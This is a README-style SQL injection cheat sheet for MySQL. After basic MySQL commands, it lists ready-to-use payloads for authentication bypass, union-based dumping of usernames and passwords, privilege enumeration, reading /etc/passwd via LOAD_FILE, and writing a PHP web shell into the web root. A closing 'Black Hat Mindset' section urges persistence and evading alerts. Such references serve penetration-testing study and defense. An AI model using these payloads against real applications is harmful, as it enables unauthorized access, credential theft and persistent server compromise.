# Basic Methodology - SQL Injection

Welcome to the SQL Injection guide! This README explores SQL injection techniques targeting MySQL databases, covering general database operations, authentication bypass, union-based injection, database enumeration, privilege checks, and file injection. Think like a black hat—exploit SQL vulnerabilities to extract data, escalate privileges, and gain unauthorized access with stealth.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [General MySQL Operations](#general-mysql-operations)
  - [Connecting to MySQL](#connecting-to-mysql)
  - [Database Management](#database-management)
  - [Table Management](#table-management)
  - [Column Management](#column-management)
  - [Query Output Control](#query-output-control)
- [SQL Injection Techniques](#sql-injection-techniques)
  - [Authentication Bypass](#authentication-bypass)
  - [Union-Based Injection](#union-based-injection)
  - [Database Enumeration](#database-enumeration)
  - [Privilege Enumeration](#privilege-enumeration)
  - [File Injection](#file-injection)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

SQL injection (SQLi) is a technique that exploits vulnerabilities in applications by injecting malicious SQL queries, allowing attackers to bypass authentication, extract data, enumerate databases, check privileges, and manipulate files. This guide focuses on MySQL, covering general database operations and SQLi payloads for exploitation.

## Setup and Prerequisites

- **Environment**: Linux host with MySQL client; access to a vulnerable MySQL database (e.g., via a web application).
- **Tools**: Install mysql client (e.g., `apt install mysql-client`).
- **Target**: Identify a vulnerable MySQL database (e.g., hosted at docker.eu:3306).
- **Credentials**: Have default credentials ready (e.g., root) or use SQLi to bypass authentication.
- **Knowledge**: Understand MySQL operator precedence:
  - Division (`/`), Multiplication (`*`), Modulus (`%`)
  - Addition (`+`), Subtraction (`-`)
  - Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
  - NOT (`!`)
  - AND (`&&`)
  - OR (`||`)

## General MySQL Operations

### Connecting to MySQL

Access a MySQL database.

```bash
$ mysql -u root -h docker.eu -P 3306 -p  # Logs into MySQL at docker.eu:3306 as user root, prompting for a password (Linux)
```

### Database Management

Manage MySQL databases.

```sql
SHOW DATABASES;  # Lists all available databases
USE users;       # Switches to the users database
```

### Table Management

Create, view, and modify tables.

```sql
CREATE TABLE logins (id INT, ...);  # Creates a table named logins with an id column of type INT
SHOW TABLES;                        # Lists all tables in the current database
DESCRIBE logins;                    # Shows properties and columns of the logins table
INSERT INTO table_name VALUES (value_1, ...);  # Adds a row to table_name
INSERT INTO table_name(column2, ...) VALUES (column2_value, ...);  # Adds values to specific columns
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>;    # Updates rows based on a condition
DROP TABLE logins;                  # Deletes the logins table
```

### Column Management

Modify table columns.

```sql
SELECT * FROM table_name;  # Shows all columns in table_name
SELECT column1, column2 FROM table_name;  # Shows specific columns
ALTER TABLE logins ADD newColumn INT;     # Adds a new column newColumn
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;  # Renames newColumn to oldColumn
ALTER TABLE logins MODIFY oldColumn DATE;  # Changes oldColumn to type DATE
ALTER TABLE logins DROP oldColumn;         # Deletes oldColumn
```

### Query Output Control

Control how query results are displayed.

```sql
SELECT * FROM logins ORDER BY column_1;  # Sorts results by column_1
SELECT * FROM logins ORDER BY column_1 DESC;  # Sorts by column_1 in descending order
SELECT * FROM logins ORDER BY column_1 DESC, id ASC;  # Sorts by column_1 (descending) and id (ascending)
SELECT * FROM logins LIMIT 2;  # Shows only the first two results
SELECT * FROM logins LIMIT 1, 2;  # Shows two results starting from index 2
SELECT * FROM table_name WHERE <condition>;  # Filters results based on a condition
SELECT * FROM logins WHERE username LIKE 'admin%';  # Filters results where username starts with admin
```

## SQL Injection Techniques

### Authentication Bypass

Bypass login mechanisms with SQLi payloads.

```sql
admin' or '1'='1    # Basic auth bypass by making the query always true
admin')-- -         # Bypasses auth with comments to ignore the rest of the query
```

### Union-Based Injection

Extract data by appending results with UNION.

```sql
' order by 1-- -    # Detects the number of columns by incrementing until an error occurs
cn' UNION select 1,2,3-- -    # Confirms the number of columns (e.g., 3 columns)
cn' UNION select 1,@@version,3,4-- -    # Retrieves the MySQL version
UNION select username, 2, 3, 4 from passwords-- -    # Extracts username from the passwords table (4 columns)
```

### Database Enumeration

Enumerate database details.

```sql
SELECT @@version;    # Fingerprints the MySQL version
SELECT SLEEP(5);     # Fingerprints MySQL by delaying response (no output)
cn' UNION select 1,database(),2,3-- -    # Retrieves the current database name
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -    # Lists all databases
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -    # Lists tables in the dev database
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -    # Lists columns in the credentials table
cn' UNION select 1, username, password, 4 from dev.credentials-- -    # Dumps username and password from dev.credentials
```

### Privilege Enumeration

Check user privileges and configurations.

```sql
cn' UNION SELECT 1, user(), 3, 4-- -    # Retrieves the current user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -    # Checks if root has admin privileges
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -    # Lists all privileges for root
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -    # Identifies accessible directories via MySQL
```

### File Injection

Read and write files using MySQL.

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -    # Reads the /etc/passwd file
select 'file written successfully!' into outfile '/var/www/html/proof.txt';    # Writes a string to proof.txt
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -    # Writes a PHP web shell to /var/www/html/shell.php
```

## Black Hat Mindset

- **Bypass Authentication**: Use simple payloads to gain unauthorized access.
- **Extract Data**: Leverage UNION injections to dump sensitive data from databases.
- **Enumerate Thoroughly**: Map out databases, tables, and columns to identify valuable targets.
- **Escalate Privileges**: Check for admin privileges and accessible directories to expand control.
- **Gain Persistence**: Write web shells to maintain access.
- **Stay Silent**: Use legitimate SQL queries to avoid triggering alerts.

## Resources

- [MySQL Documentation](https://dev.mysql.com/doc/)
- [SQL Injection Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

